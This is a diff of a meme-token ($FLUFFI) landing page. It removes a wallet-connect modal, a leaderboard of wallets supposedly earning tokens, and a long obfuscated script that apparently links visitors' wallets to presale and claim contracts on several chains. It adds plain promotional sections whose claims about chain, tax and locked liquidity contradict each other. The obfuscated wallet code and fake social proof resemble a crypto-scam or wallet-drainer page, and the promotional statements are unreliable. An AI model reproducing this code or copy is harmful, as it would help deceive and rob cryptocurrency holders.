+        <p class="mt-4 text-sm text-gray-600 dark:text-gray-400">
+          Always verify the contract address before trading. Beware of fake copies!
+        </p>
       </div>
     </div>
   </section>
-</div>
-<section id="community-activity" class="py-12 bg-green-50 dark:bg-gray-800">
-  <h2 class="text-3xl font-bold text-center text-green-600 dark:text-green-400 mb-8">
-    🔥 Live Community Activity
-  </h2>
-  <div id="liveFeed" class="max-w-2xl mx-auto bg-white dark:bg-gray-700 p-6 rounded-2xl shadow-lg mb-8 text-center">
-    <p id="feedMessage" class="text-lg font-medium text-gray-800 dark:text-gray-200">Loading latest activity...</p>
-  </div>
-<div class="bg-green-600 dark:bg-green-700 text-white py-3 overflow-hidden relative">
-  <div id="leaderboard" class="whitespace-nowrap animate-marquee text-lg font-bold">
-    <span class="mx-6">0xA12...F45 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0xC98...B72 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x7F3...D91 earned 150,000 FLUFFI</span>
-    <span class="mx-6">0x4B7...E28 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x9D2...A34 earned 75,000 FLUFFI</span>
-    <span class="mx-6">0xE56...C78 earned 100,000 FLUFFI</span>
-    <span class="mx-6">0x2F8...D90 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x5C1...E23 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x8A9...F67 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x3B4...D12 earned 150,000 FLUFFI</span>
-    <span class="mx-6">0x6E7...A89 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x1D5...C34 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x9F2...B78 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x4C8...E56 earned 100,000 FLUFFI</span>
-    <span class="mx-6">0x7A3...D91 earned 250,000 FLUFFI</span>
-    <span class="mx-6">0x2B6...F24 earned 80,000 FLUFFI</span>
-    <span class="mx-6">0x5E9...C67 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x8D1...A90 earned 150,000 FLUFFI</span>
-    <span class="mx-6">0x3F4...B23 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x6C2...E78 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x1A7...D45 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x9B8...F12 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x4E5...C89 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x7D2...A34 earned 150,000 FLUFFI</span>
-    <span class="mx-6">0x2C9...B67 earned 100,000 FLUFFI</span>
-    <span class="mx-6">0x5F6...E90 earned 200,000 FLUFFI</span>
-    <span class="mx-6">0x8B3...D23 earned 95,000 FLUFFI</span>
-    <span class="mx-6">0x3A1...F56 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x6C4...B89 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x1E7...A12 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x9D5...C45 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x4B2...E78 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x7F8...D91 earned 150,000 FLUFFI</span>
-    <span class="mx-6">0x2A6...B34 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x5C9...F67 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x8E1...A90 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x3D4...C23 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x6B2...E56 earned 80,000 FLUFFI</span>
-    <span class="mx-6">0x1F7...B89 earned 100,000 FLUFFI</span>
-    <span class="mx-6">0x9A8...D12 earned 75,000 FLUFFI</span>
-    <span class="mx-6">0x4C5...F45 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x7E3...A78 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x2B1...C91 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x5D6...E34 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x8F4...B67 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x3C2...D90 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x6A9...F23 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x1E8...A56 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x9B5...C89 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x4D7...E12 earned 50,000 FLUFFI</span>
-    <span class="mx-6">0x7F2...B45 earned 80,000 FLUFFI</span>
-    <span class="mx-6">0x2C4...D78 earned 80,000 FLUFFI</span>
-  </div>
-</div>
-</section>  
-<footer class="flex flex-col md:flex-row justify-between px-6 py-6 text-sm text-gray-600 dark:text-gray-300 bg-gray-100 dark:bg-gray-800">
-  <div class="mb-4 md:mb-0">© 2025 $FLUFFI Token - All Rights Reserved</div>
-  <div class="flex gap-4 justify-center md:justify-end">
-    <a href="https://t.me/FLUFFI_BSC_OFFICIAL" target="_blank" rel="noopener noreferrer" title="Telegram" class="hover:opacity-75">
-      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/telegram.svg" alt="Telegram" class="w-5 h-5" width="20" height="20">
-    </a>
-    <a href="https://x.com/FLUFFIOFFICIAL" target="_blank" rel="noopener noreferrer" title="Twitter" class="hover:opacity-75">
-      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/x.svg" alt="Twitter" class="w-5 h-5" width="20" height="20">
-    </a>
-  </div>
-</footer>
-<div id="walletModal" class="wallet-modal">
-  <div class="wallet-modal-content dark:bg-gray-800">
-    <div class="wallet-header">
-      <h3 class="text-xl font-bold">Connect Wallet</h3>
-      <span class="wallet-close" onclick="closeWalletModal()">&times;</span>
-    </div>
-    <div class="wallet-option" onclick="connectWallet('metamask')">
-      <div class="flex items-center w-full">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
-        <span class="ml-3">MetaMask</span>
+
+  <section id="why-fluffi" class="px-6 py-16 bg-white dark:bg-gray-900">
+    <div class="max-w-6xl mx-auto">
+      <h2 class="text-3xl font-extrabold text-center text-green-600 dark:text-green-400 mb-12">
+        ❓ Why Fluffi Coin?
+      </h2>
+      <div class="grid md:grid-cols-3 gap-8">
+        <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-2xl shadow-lg">
+          <div class="text-5xl mb-4">🔥</div>
+          <h3 class="text-xl font-semibold mb-3">Pure Meme Energy</h3>
+          <p class="text-gray-700 dark:text-gray-300">
+            Fluffi isn't just another token—it's a movement. Born from the community, for the community.
+          </p>
+        </div>
+        <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-2xl shadow-lg">
+          <div class="text-5xl mb-4">🔒</div>
+          <h3 class="text-xl font-semibold mb-3">Transparent & Secure</h3>
+          <p class="text-gray-700 dark:text-gray-300">
+            Liquidity locked, contract renounced. We're here for the long haul with full transparency.
+          </p>
+        </div>
+        <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-2xl shadow-lg">
+          <div class="text-5xl mb-4">🚀</div>
+          <h3 class="text-xl font-semibold mb-3">Pump.fun Ready</h3>
+          <p class="text-gray-700 dark:text-gray-300">
+            Already minted and listed on the most popular Solana launchpad. Easy to buy and trade.
+          </p>
+        </div>
       </div>
-      <div class="wallet-help-btn" onclick="showConnectionHelp('metamask', event)">?</div>
     </div>
-    <div class="wallet-option" onclick="connectWallet('trust')">
-      <div class="flex items-center w-full">
-        <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
-        <span class="ml-3">Trust Wallet</span>
+  </section>
+
+  <section id="faq" class="px-6 py-16 bg-gray-50 dark:bg-gray-800">
+    <div class="max-w-3xl mx-auto">
+      <h2 class="text-3xl font-bold text-center mb-12 text-green-600 dark:text-green-400">❓ FAQ</h2>
+      
+      <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
+        <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
+          Where can I buy $FLUFFI?
+          <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
+            viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M19 9l-7 7-7-7" />
+          </svg>
+        </summary>
+        <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
+          $FLUFFI is available on Pump.fun. You'll need a Solana wallet (like Phantom) and some SOL to trade.
+        </div>
+      </details>
+
+      <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
+        <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
+          What's the transaction tax?
+          <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
+            viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M19 9l-7 7-7-7" />
+          </svg>
+        </summary>
+        <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
+          5% total tax on all transactions: 3% goes to liquidity pool, 2% to marketing and development.
+        </div>
+      </details>
+
+      <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
+        <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
+          Is liquidity locked?
+          <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
+            viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M19 9l-7 7-7-7" />
+          </svg>
+        </summary>
+        <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
+          Yes! 50% of total supply is locked in liquidity for 12 months. You can verify this on Pump.fun.
+        </div>
+      </details>
+
+      <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
+        <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
+          What chain is $FLUFFI on?
+          <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
+            viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M19 9l-7 7-7-7" />
+          </svg>
+        </summary>
+        <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
+          $FLUFFI is a Solana SPL token, perfect for fast and cheap transactions.
+        </div>
+      </details>
+
+      <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
+        <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
+          How do I stay updated?
+          <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
+            viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M19 9l-7 7-7-7" />
+          </svg>
+        </summary>
+        <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
+          Follow our Twitter and join our Telegram community for the latest updates and announcements.
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <section class="px-6 py-16 bg-green-600 dark:bg-green-700 text-white text-center">
+    <div class="max-w-4xl mx-auto">
+      <h2 class="text-3xl font-bold mb-6">Join the Fluffi Family</h2>
+      <p class="text-xl mb-8">Be part of the cutest revolution in crypto. Let's make memes matter!</p>
+      <div class="flex flex-wrap gap-4 justify-center">
+        <a href="https://t.me/FLUFFI_BSC_OFFICIAL" target="_blank" rel="noopener noreferrer" 
+           class="bg-white text-green-700 px-6 py-3 rounded-full font-semibold hover:bg-gray-100 transition-colors">
+          Telegram
+        </a>
+        <a href="https://x.com/FLUFFIOFFICIAL" target="_blank" rel="noopener noreferrer" 
+           class="bg-black px-6 py-3 rounded-full font-semibold hover:bg-gray-800 transition-colors">
+          Twitter
+        </a>
+        <a href="https://pump.fun" target="_blank" rel="noopener noreferrer" 
+           class="bg-purple-600 px-6 py-3 rounded-full font-semibold hover:bg-purple-700 transition-colors">
+          Trade on Pump.fun
+        </a>
       </div>
-      <div class="wallet-help-btn" onclick="showConnectionHelp('trust', event)">?</div>
     </div>
-    <div class="wallet-option" onclick="connectWallet('walletconnect')">
-      <div class="flex items-center w-full">
-        <img src="walletconnect-seeklogo.png" alt="walletconnect" class="w-6 h-6">
-        <span class="ml-3">WalletConnect</span>
+  </section>
+
+  <footer class="px-6 py-8 text-sm text-gray-600 dark:text-gray-300 bg-gray-100 dark:bg-gray-800">
+    <div class="max-w-6xl mx-auto">
+      <div class="flex flex-col md:flex-row justify-between items-center">
+        <div class="mb-4 md:mb-0">© 2025 $FLUFFI Token - All Rights Reserved</div>
+        <div class="flex gap-4">
+          <a href="https://t.me/FLUFFI_BSC_OFFICIAL" target="_blank" rel="noopener noreferrer" class="hover:opacity-75">
+            Telegram
+          </a>
+          <a href="https://x.com/FLUFFIOFFICIAL" target="_blank" rel="noopener noreferrer" class="hover:opacity-75">
+            Twitter
+          </a>
+          <a href="https://pump.fun" target="_blank" rel="noopener noreferrer" class="hover:opacity-75">
+            Pump.fun
+          </a>
+        </div>
       </div>
-      <div class="wallet-help-btn" onclick="showConnectionHelp('walletconnect', event)">?</div>
-    </div>
-    <div class="wallet-option" onclick="connectWallet('phantom')">
-      <div class="flex items-center w-full">
-        <img src="Phantom-Icon_App_1200x1200.png" alt="Phantom" class="w-6 h-6">
-        <span class="ml-3">Phantom</span>
+      <div class="mt-4 text-center text-xs text-gray-500 dark:text-gray-400">
+        $FLUFFI is a meme token. Cryptocurrency investments are highly volatile. Only invest what you can afford to lose.
       </div>
-      <div class="wallet-help-btn" onclick="showConnectionHelp('phantom', event)">?</div>
     </div>
-  </div>
-</div>
-<div id="walletConnectModal" class="wallet-connect-modal">
-  <div class="wallet-connect-content dark:bg-gray-800">
-    <span class="wallet-connect-close" onclick="closeWalletConnectModal()">&times;</span>
-    <h3 class="text-lg font-bold mb-2">Scan with WalletConnect</h3>
-    <p class="text-gray-600 dark:text-gray-300 text-sm mb-4">Use your mobile wallet to scan this QR code</p>
-    <div id="walletConnectQrCode"></div>
-    <p id="walletConnectLink" class="wallet-connect-link hidden">Or open in wallet app</p>
-  </div>
-</div>
-<div id="connectionHelpModal" class="help-modal">
-  <div class="help-modal-content dark:bg-gray-800">
-    <span class="help-close" onclick="closeHelpModal()">&times;</span>
-    <div id="helpContent"></div>
-  </div>
-</div>
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script>const _0x1bf7bf=_0x38e3;(function(_0x3af1bb,_0x1938fe){const _0x129d64=_0x38e3,_0x370d0a=_0x3af1bb();while(!![]){try{const _0x1f2bc2=-parseInt(_0x129d64(0xdc))/0x1+parseInt(_0x129d64(0x2a1))/0x2+-parseInt(_0x129d64(0x2bf))/0x3*(-parseInt(_0x129d64(0x15a))/0x4)+-parseInt(_0x129d64(0x9f))/0x5+parseInt(_0x129d64(0xf0))/0x6*(parseInt(_0x129d64(0x2fb))/0x7)+parseInt(_0x129d64(0x242))/0x8+parseInt(_0x129d64(0xbf))/0x9*(-parseInt(_0x129d64(0x2b0))/0xa);if(_0x1f2bc2===_0x1938fe)break;else _0x370d0a['push'](_0x370d0a['shift']());}catch(_0x44fd70){_0x370d0a['push'](_0x370d0a['shift']());}}}(_0x7557,0x7cdcc));let tokenChart=null;const PRICE_API_ENDPOINTS={'BINANCE':_0x1bf7bf(0x266),'COINGECKO':'https://api.coingecko.com/api/v3/simple/price?ids=','COINMARKETCAP':'https://pro-api.coinmarketcap.com/v1/cryptocurrency/quotes/latest'},COIN_SYMBOLS={'BNB':_0x1bf7bf(0x24c),'ETH':'ETHUSDT','SOL':_0x1bf7bf(0x1a2),'AVAX':'AVAXUSDT','MATIC':_0x1bf7bf(0x23e),'USDC':'USDCUSDT'};async function getCurrentPrice(_0x3cc6c5){const _0x676f0d=_0x1bf7bf;try{const _0x448e0f=_0x676f0d(0x2cf)+_0x3cc6c5,_0x53cc8b=localStorage[_0x676f0d(0x297)](_0x448e0f),_0x141290=Date[_0x676f0d(0x1fb)]();if(_0x53cc8b){const {price:_0x3a7328,timestamp:_0xc86a2a}=JSON['parse'](_0x53cc8b);if(_0x141290-_0xc86a2a<0x7530)return _0x3a7328;}let _0x5a1e95;if(_0x3cc6c5!==_0x676f0d(0xb3)){const _0x553ff7=COIN_SYMBOLS[_0x3cc6c5],_0x1fbf12=await fetch(_0x676f0d(0x266)+_0x553ff7),_0x1cbcb0=await _0x1fbf12[_0x676f0d(0x7b)]();_0x5a1e95=parseFloat(_0x1cbcb0['price']);}else _0x5a1e95=0x1;return localStorage['setItem'](_0x448e0f,JSON[_0x676f0d(0x263)]({'price':_0x5a1e95,'timestamp':_0x141290})),_0x5a1e95;}catch(_0x56aebc){console[_0x676f0d(0x1dd)]('Error\x20fetching\x20'+_0x3cc6c5+_0x676f0d(0x1ae),_0x56aebc);const _0xea31a2={'BNB':0x466,'ETH':0xfe6,'SOL':0xc6,'AVAX':20.5,'MATIC':0.2,'USDC':0x1,'USD':0x1};return _0xea31a2[_0x3cc6c5]||0x1;}}const CONTRACT_ADDRESSES={0x1:'0x50Db663330bcC1933F55a15CBc66348a4C4289a8',0x38:_0x1bf7bf(0x286),0xa86a:_0x1bf7bf(0xe1)},NETWORK_CONFIGS={0x1:{'name':_0x1bf7bf(0x2be),'currency':'ETH','rpcUrl':_0x1bf7bf(0x112),'explorer':_0x1bf7bf(0x1c2)},0x38:{'name':_0x1bf7bf(0xb5),'currency':'BNB','rpcUrl':'https://bsc-dataseed.binance.org/','explorer':'https://bscscan.com'},0xa86a:{'name':_0x1bf7bf(0x1c8),'currency':_0x1bf7bf(0x125),'rpcUrl':_0x1bf7bf(0x87),'explorer':_0x1bf7bf(0xde)}};let solanaConnection=null,solanaProvider=null;function initSolanaConnection(){const _0x38d08d=_0x1bf7bf;try{solanaConnection=new solanaWeb3[(_0x38d08d(0x2d6))](NETWORK_CONFIGS['solana-devnet'][_0x38d08d(0x220)],_0x38d08d(0x1be)),console[_0x38d08d(0x1c9)](_0x38d08d(0xba));}catch(_0xff3aab){console['error'](_0x38d08d(0x2eb),_0xff3aab);}}const FLUFFI_CONTRACT_ABI=[{'inputs':[{'internalType':'address','name':_0x1bf7bf(0x26b),'type':_0x1bf7bf(0x276)},{'internalType':'uint256','name':'_tokenPrice','type':'uint256'},{'internalType':'uint256','name':_0x1bf7bf(0x1de),'type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x303),'type':_0x1bf7bf(0x2f5)},{'anonymous':![],'inputs':[],'name':'DistributionStarted','type':_0x1bf7bf(0x2ce)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1bf7bf(0x276),'name':_0x1bf7bf(0x1f4),'type':_0x1bf7bf(0x276)},{'indexed':![],'internalType':'uint256','name':_0x1bf7bf(0x140),'type':_0x1bf7bf(0xf9)}],'name':_0x1bf7bf(0x202),'type':_0x1bf7bf(0x2ce)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x1bf7bf(0x1af),'type':_0x1bf7bf(0x276)},{'indexed':![],'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x140),'type':_0x1bf7bf(0xf9)}],'name':_0x1bf7bf(0x291),'type':_0x1bf7bf(0x2ce)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':'recipient','type':_0x1bf7bf(0x276)},{'indexed':![],'internalType':'uint256','name':'amount','type':_0x1bf7bf(0xf9)}],'name':'TokensDistributed','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1bf7bf(0x276),'name':'buyer','type':_0x1bf7bf(0x276)},{'indexed':![],'internalType':'uint256','name':'amount','type':'uint256'},{'indexed':![],'internalType':'uint256','name':_0x1bf7bf(0x2ca),'type':_0x1bf7bf(0xf9)}],'name':_0x1bf7bf(0x83),'type':_0x1bf7bf(0x2ce)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1bf7bf(0x276),'name':_0x1bf7bf(0x1af),'type':_0x1bf7bf(0x276)},{'indexed':![],'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x140),'type':_0x1bf7bf(0xf9)}],'name':_0x1bf7bf(0x187),'type':_0x1bf7bf(0x2ce)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1bf7bf(0x276),'name':'staker','type':'address'},{'indexed':![],'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x140),'type':'uint256'}],'name':'TokensUnstaked','type':'event'},{'inputs':[],'name':'APY','outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x230),'outputs':[{'internalType':'address','name':'','type':_0x1bf7bf(0x276)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x1e1),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':'uint256'}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[{'internalType':_0x1bf7bf(0x276),'name':_0x1bf7bf(0x1f4),'type':_0x1bf7bf(0x276)}],'name':_0x1bf7bf(0x26a),'outputs':[],'stateMutability':'payable','type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0xb8),'outputs':[],'stateMutability':_0x1bf7bf(0x303),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':'claimRewards','outputs':[],'stateMutability':_0x1bf7bf(0x303),'type':_0x1bf7bf(0x172)},{'inputs':[{'internalType':_0x1bf7bf(0x1f7),'name':'recipients','type':_0x1bf7bf(0x1f7)}],'name':'distributeTokens','outputs':[],'stateMutability':_0x1bf7bf(0x303),'type':'function'},{'inputs':[],'name':'distributionStarted','outputs':[{'internalType':'bool','name':'','type':_0x1bf7bf(0x16a)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x19e),'outputs':[],'stateMutability':_0x1bf7bf(0x303),'type':'function'},{'inputs':[],'name':_0x1bf7bf(0x2e4),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':'uint256'}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0xd0),'outputs':[{'internalType':_0x1bf7bf(0x16a),'name':_0x1bf7bf(0xf3),'type':_0x1bf7bf(0x16a)},{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x1e8),'type':_0x1bf7bf(0xf9)},{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x2a3),'type':_0x1bf7bf(0xf9)},{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x16c),'type':_0x1bf7bf(0xf9)},{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x17d),'type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x79),'outputs':[{'internalType':'uint256','name':'','type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[{'internalType':_0x1bf7bf(0x276),'name':'user','type':'address'}],'name':'getUserInfo','outputs':[{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x2a5),'type':_0x1bf7bf(0xf9)},{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x243),'type':_0x1bf7bf(0xf9)},{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x1ad),'type':_0x1bf7bf(0xf9)},{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x167),'type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[{'internalType':'address','name':'','type':_0x1bf7bf(0x276)}],'name':_0x1bf7bf(0x134),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':'uint256'}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x8d),'outputs':[{'internalType':_0x1bf7bf(0x276),'name':'','type':'address'}],'stateMutability':_0x1bf7bf(0x102),'type':'function'},{'inputs':[],'name':_0x1bf7bf(0xd3),'outputs':[{'internalType':'bool','name':'','type':_0x1bf7bf(0x16a)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x109),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x272),'outputs':[{'internalType':'uint256','name':'','type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[{'internalType':_0x1bf7bf(0x276),'name':'','type':'address'}],'name':_0x1bf7bf(0xce),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x1bf7bf(0x276),'name':'','type':'address'}],'name':'referrers','outputs':[{'internalType':_0x1bf7bf(0x276),'name':'','type':_0x1bf7bf(0x276)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x140),'type':_0x1bf7bf(0xf9)}],'name':_0x1bf7bf(0x261),'outputs':[],'stateMutability':'nonpayable','type':_0x1bf7bf(0x172)},{'inputs':[{'internalType':_0x1bf7bf(0x276),'name':'','type':_0x1bf7bf(0x276)}],'name':_0x1bf7bf(0x237),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x102),'type':'function'},{'inputs':[{'internalType':_0x1bf7bf(0x276),'name':'','type':'address'}],'name':'stakingStartTime','outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':'uint256'}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x264),'outputs':[],'stateMutability':_0x1bf7bf(0x303),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x24d),'outputs':[{'internalType':_0x1bf7bf(0x12c),'name':'','type':_0x1bf7bf(0x276)}],'stateMutability':'view','type':_0x1bf7bf(0x172)},{'inputs':[{'internalType':_0x1bf7bf(0x276),'name':'','type':_0x1bf7bf(0x276)}],'name':_0x1bf7bf(0xf6),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':_0x1bf7bf(0xf9)}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0xa1),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':'uint256'}],'stateMutability':_0x1bf7bf(0x102),'type':'function'},{'inputs':[],'name':_0x1bf7bf(0x18c),'outputs':[{'internalType':_0x1bf7bf(0xf9),'name':'','type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x1bf7bf(0x265),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x1bf7bf(0x102),'type':_0x1bf7bf(0x172)},{'inputs':[{'internalType':_0x1bf7bf(0xf9),'name':_0x1bf7bf(0x140),'type':_0x1bf7bf(0xf9)}],'name':_0x1bf7bf(0xa4),'outputs':[],'stateMutability':_0x1bf7bf(0x303),'type':'function'},{'inputs':[{'internalType':_0x1bf7bf(0xf9),'name':'newPrice','type':_0x1bf7bf(0xf9)}],'name':_0x1bf7bf(0x12a),'outputs':[],'stateMutability':_0x1bf7bf(0x303),'type':_0x1bf7bf(0x172)},{'inputs':[],'name':_0x1bf7bf(0x2fe),'outputs':[],'stateMutability':_0x1bf7bf(0x303),'type':_0x1bf7bf(0x172)}];async function getFluffiContract(_0x1ef2e7){const _0x5828eb=_0x1bf7bf;try{const _0x71c4b3=await _0x1ef2e7['getNetwork'](),_0x2ff9e4=_0x71c4b3[_0x5828eb(0x11e)],_0x342b70=CONTRACT_ADDRESSES[_0x2ff9e4];if(!_0x342b70)throw new Error(_0x5828eb(0xff)+_0x2ff9e4+_0x5828eb(0x24a));return new ethers[(_0x5828eb(0x1f8))](_0x342b70,FLUFFI_CONTRACT_ABI,_0x1ef2e7[_0x5828eb(0x27b)]());}catch(_0x59b6df){console[_0x5828eb(0x1dd)](_0x5828eb(0x2aa),_0x59b6df);throw _0x59b6df;}}const WALLETCONNECT_CONFIG={'projectId':_0x1bf7bf(0x232),'chains':[0x38],'showQrModal':![],'qrModalOptions':{'themeMode':_0x1bf7bf(0xd2),'mobileWallets':[{'id':'metamask','name':'MetaMask','links':{'native':_0x1bf7bf(0x239),'universal':_0x1bf7bf(0x88)}},{'id':'trust','name':_0x1bf7bf(0x25b),'links':{'native':_0x1bf7bf(0x20d),'universal':_0x1bf7bf(0x28a)}}]},'metadata':{'name':'FLUFFI\x20Presale','description':_0x1bf7bf(0x96),'url':window[_0x1bf7bf(0x123)][_0x1bf7bf(0x194)],'icons':[_0x1bf7bf(0x118)]}};let userWalletAddress=null,tasksCompleted={'twitter':![],'telegram':![],'retweet':![]},countdownInterval=null,provider=null,isSolanaWallet=![],presaleInterval=null;window[_0x1bf7bf(0x123)][_0x1bf7bf(0x15d)]['includes'](_0x1bf7bf(0x1ee))&&document[_0x1bf7bf(0x26f)](_0x1bf7bf(0x1d1))['classList'][_0x1bf7bf(0xaa)](_0x1bf7bf(0xca));document[_0x1bf7bf(0x10b)](_0x1bf7bf(0xdd),async function(){const 